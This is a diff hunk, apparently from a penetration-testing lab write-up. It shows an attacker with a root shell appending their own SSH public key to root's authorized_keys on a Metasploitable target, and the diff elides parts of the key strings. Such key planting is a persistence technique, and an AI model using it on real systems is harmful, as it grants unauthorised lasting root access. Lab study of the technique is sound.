@@ -171,25 +171,19 @@ root@alice:/mnt/root/.ssh# cat authorized_keys
 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGo
 i4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL
 /0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWW
-TQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU
-3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA
+......
 73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVx
 sXovcNnbALTp3w== msfadmin@metasploitable
 root@alice:/mnt/root/.ssh# cat noondi_rsa.pub >> authorized_keys
 root@alice:/mnt/root/.ssh# cat authorized_keys
 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNm
 j6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKA
-z1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777
-GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIz
+.....
 Iu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2
 OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable #original keys
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDF3V6SXuhO0PVKyUa9hwPJ965GrJMkgAbm2fQtS
 +S3eBDHhP5oLucXIjhlN3MyE8nkOYikej57XigwpJk/Ki38JzVX/rhEjbbLNTa4T26qWxzBSd9ly
-WeLQXkRaJt1ekzdwdOI/b9EhDSF127ApwTZ9U+jaB8Zx+q5yjxEji99w3r1d2paZQoaxvaXJgHUB
-FgLXaSGPGBGVkkhIm0SXyxDINmBFERCLVGZ+r0+YikjLDL8wDxlDzLj29S9Wkt1RK5gkDGHGKtX
-/gBHNkDkVCsXUjnfyMAeC1NP85qVAqNjZgPvxOliYYReDVwjNvBsSQDjKAjR/L75uxnobaz2oWHzw
-PhlfCuCWZxuAv8KdbNTbcmXznU3KQZJRXgn7Bb4uvq2E/D2zSzM+aavcpFBMV9C4AYjOdqwz00z2
-ghf6CI8WMp+QfttmR+x0RZhcd4u+H9ZfXmXfWr69XZ1JpldrzzOFNnXZnM9gWv/U2OI4udBJZOcA
+.....
 qFtavcyYXmAao5RVIk1XjlGaIhj9S9VNdD1An7bfC7GANFoycQi2F2kgjzoVIB6W0ZTEf/pxM6b4
 ULZF1AgTRLrUPktop+PRjO7Z/cLA8XY8ZULqSYfN2U94AqvygtdKyc+CTC+Nmn81QK31AeD5T50A
 SjYRqCjZCDabiukQqGSNTGODgzuIrhE5peM+Q== root@alice # appended keys
